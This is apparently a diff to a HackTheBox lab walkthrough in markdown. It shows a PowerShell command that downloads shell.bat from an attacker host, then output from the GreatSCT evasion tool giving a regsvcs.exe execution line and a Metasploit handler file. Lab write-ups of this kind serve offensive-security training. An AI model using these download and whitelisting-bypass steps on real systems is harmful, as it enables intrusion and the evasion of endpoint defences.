@@ -121,3 +121,25 @@ powershell wget http://10.10.16.5/shell.bat -outfile shell.bat
 ```
 
 ![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/ff0dbd6a-4b09-460b-bcf1-3825d822b431)
+
+https://github.com/GreatSCT/GreatSCT
+
+```
+===============================================================================
+                                   Great Scott!
+===============================================================================
+      [Web]: https://github.com/GreatSCT/GreatSCT | [Twitter]: @ConsciousHacker
+===============================================================================
+
+ [!] ERROR: Unable to create output file.
+ [*] Source code written to: /usr/share/greatsct-output/source/serv.cs
+ [*] Execute with: C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe serv.dll
+ [*] Metasploit RC file written to: /usr/share/greatsct-output/handlers/serv.rc
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/44f2c4d2-4333-4f8a-bef1-084b2137e1c5)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c4af559d-6087-4b07-a1ff-680bc4377f79)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/1c33cb0b-3801-4bc1-b98b-5bd33125c762)
+
